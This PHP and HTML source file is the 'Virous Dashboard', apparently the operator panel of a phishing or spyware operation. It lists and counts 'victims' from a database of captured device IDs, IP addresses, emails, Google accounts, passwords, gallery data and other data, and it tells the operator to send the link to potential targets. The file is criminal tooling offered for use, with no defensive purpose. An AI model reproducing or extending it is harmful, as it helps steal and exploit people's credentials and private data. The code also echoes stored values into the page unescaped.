<?php
// Database configuration
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'virous_data';

// Create database connection
$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Function to get all victim data
function getVictimData($conn, $limit = 50) {
    $sql = "SELECT * FROM victim_data ORDER BY timestamp DESC LIMIT $limit";
    $result = $conn->query($sql);
    
    $data = [];
    if ($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            // Decode JSON data
            if (!empty($row['passwords'])) {
                $row['passwords'] = json_decode($row['passwords'], true);
            }
            if (!empty($row['gallery_data'])) {
                $row['gallery_data'] = json_decode($row['gallery_data'], true);
            }
            if (!empty($row['other_data'])) {
                $row['other_data'] = json_decode($row['other_data'], true);
            }
            $data[] = $row;
        }
    }
    
    return $data;
}

// Function to get victim data by ID
function getVictimById($conn, $id) {
    $id = $conn->real_escape_string($id);
    $sql = "SELECT * FROM victim_data WHERE id = '$id'";
    $result = $conn->query($sql);
    
    if ($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        // Decode JSON data
        if (!empty($row['passwords'])) {
            $row['passwords'] = json_decode($row['passwords'], true);
        }
        if (!empty($row['gallery_data'])) {
            $row['gallery_data'] = json_decode($row['gallery_data'], true);
        }
        if (!empty($row['other_data'])) {
            $row['other_data'] = json_decode($row['other_data'], true);
        }
        return $row;
    }
    
    return null;
}

// Handle AJAX requests
if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    
    switch ($_GET['action']) {
        case 'get_all':
            echo json_encode(getVictimData($conn));
            break;
            
        case 'get_victim':
            if (isset($_GET['id'])) {
                echo json_encode(getVictimById($conn, $_GET['id']));
            } else {
                echo json_encode(['error' => 'No ID provided']);
            }
            break;
            
        default:
            echo json_encode(['error' => 'Invalid action']);
    }
    
    exit;
}

// Get victim data for display
$victims = getVictimData($conn);
$victim_count = count($victims);

// Get stats
$sql = "SELECT COUNT(*) as total FROM victim_data";
$result = $conn->query($sql);
$total_victims = 0;
if ($result && $result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $total_victims = $row['total'];
}

$sql = "SELECT COUNT(DISTINCT ip_address) as unique_ips FROM victim_data";
$result = $conn->query($sql);
$unique_ips = 0;
if ($result && $result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $unique_ips = $row['unique_ips'];
}

$sql = "SELECT COUNT(*) as with_email FROM victim_data WHERE email != ''";
$result = $conn->query($sql);
$with_email = 0;
if ($result && $result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $with_email = $row['with_email'];
}

// Close connection
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Virous Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <style>
        body {
            background-color: #f8f9fa;
        }
        .navbar {
            background-color: #212529;
        }
        .card {
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .stat-card {
            text-align: center;
            padding: 20px;
        }
        .stat-card i {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        .stat-card .number {
            font-size: 1.8rem;
            font-weight: bold;
        }
        .stat-card .label {
            font-size: 1rem;
            color: #6c757d;
        }
        .table-responsive {
            border-radius: 10px;
            overflow: hidden;
        }
        .victim-detail {
            display: none;
        }
        .modal-body pre {
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark mb-4">
        <div class="container">
            <a class="navbar-brand" href="#">Virous Dashboard</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="#"><i class="bi bi-house-fill"></i> Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#"><i class="bi bi-gear-fill"></i> Settings</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#"><i class="bi bi-box-arrow-right"></i> Logout</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container">
        <h1 class="mb-4">Dashboard Overview</h1>
        
        <div class="row">
            <div class="col-md-4">
                <div class="card stat-card">
                    <i class="bi bi-people-fill text-primary"></i>
                    <div class="number"><?php echo $total_victims; ?></div>
                    <div class="label">Total Victims</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card stat-card">
                    <i class="bi bi-globe text-success"></i>
                    <div class="number"><?php echo $unique_ips; ?></div>
                    <div class="label">Unique IP Addresses</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card stat-card">
                    <i class="bi bi-envelope-fill text-danger"></i>
                    <div class="number"><?php echo $with_email; ?></div>
                    <div class="label">Accounts Captured</div>
                </div>
            </div>
        </div>
        
        <div class="card mt-4">
            <div class="card-header bg-dark text-white">
                <h5 class="mb-0">Recent Victims</h5>
            </div>
            <div class="card-body">
                <?php if ($victim_count > 0): ?>
                <div class="table-responsive">
                    <table class="table table-striped table-hover">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Device ID</th>
                                <th>IP Address</th>
                                <th>Email</th>
                                <th>Timestamp</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($victims as $victim): ?>
                            <tr>
                                <td><?php echo $victim['id']; ?></td>
                                <td><?php echo $victim['device_id']; ?></td>
                                <td><?php echo $victim['ip_address']; ?></td>
                                <td><?php echo $victim['email'] ? $victim['email'] : '<span class="text-muted">Not captured</span>'; ?></td>
                                <td><?php echo $victim['timestamp']; ?></td>
                                <td>
                                    <button class="btn btn-sm btn-primary view-details" data-id="<?php echo $victim['id']; ?>">
                                        <i class="bi bi-eye"></i> View
                                    </button>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                <?php else: ?>
                <div class="alert alert-info">
                    No victim data available yet. Send the link to potential targets to collect data.
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <!-- Victim Details Modal -->
    <div class="modal fade" id="victimModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header bg-dark text-white">
                    <h5 class="modal-title">Victim Details</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6>Basic Information</h6>
                            <ul class="list-group mb-3">
                                <li class="list-group-item"><strong>Device ID:</strong> <span id="modal-device-id"></span></li>
                                <li class="list-group-item"><strong>IP Address:</strong> <span id="modal-ip"></span></li>
                                <li class="list-group-item"><strong>Timestamp:</strong> <span id="modal-timestamp"></span></li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h6>Account Information</h6>
                            <ul class="list-group mb-3">
                                <li class="list-group-item"><strong>Email:</strong> <span id="modal-email"></span></li>
                                <li class="list-group-item"><strong>Google Account:</strong> <span id="modal-google"></span></li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="row">
                        <div class="col-12">
                            <h6>User Agent</h6>
                            <pre class="bg-light p-2" id="modal-user-agent"></pre>
                        </div>
                    </div>
                    
                    <div class="row mt-3">
                        <div class="col-12">
                            <h6>Passwords</h6>
                            <pre class="bg-light p-2" id="modal-passwords"></pre>
                        </div>
                    </div>
                    
                    <div class="row mt-3">
                        <div class="col-12">
                            <h6>Other Data</h6>
                            <pre class="bg-light p-2" id="modal-other-data"></pre>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // View details button click handler
            const viewButtons = document.querySelectorAll('.view-details');
            viewButtons.forEach(button => {
                button.addEventListener('click', function() {
                    const victimId = this.getAttribute('data-id');
                    fetchVictimDetails(victimId);
                });
            });
            
            // Function to fetch victim details
            function fetchVictimDetails(id) {
                fetch(`dashboard.php?action=get_victim&id=${id}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.error) {
                            alert('Error: ' + data.error);
                            return;
                        }
                        
                        // Populate modal with victim data
                        document.getElementById('modal-device-id').textContent = data.device_id;
                        document.getElementById('modal-ip').textContent = data.ip_address;
                        document.getElementById('modal-timestamp').textContent = data.timestamp;
                        document.getElementById('modal-email').textContent = data.email || 'Not captured';
                        document.getElementById('modal-google').textContent = data.google_account || 'Not captured';
                        document.getElementById('modal-user-agent').textContent = data.user_agent;
                        
                        // Format JSON data
                        document.getElementById('modal-passwords').textContent = 
                            data.passwords ? JSON.stringify(data.passwords, null, 2) : 'No password data';
                            
                        document.getElementById('modal-other-data').textContent = 
                            data.other_data ? JSON.stringify(data.other_data, null, 2) : 'No additional data';
                        
                        // Show the modal
                        const modal = new bootstrap.Modal(document.getElementById('victimModal'));
                        modal.show();
                    })
                    .catch(error => {
                        console.error('Error fetching victim details:', error);
                        alert('Error fetching victim details. Please try again.');
                    });
            }
        });
    </script>
</body>
</html>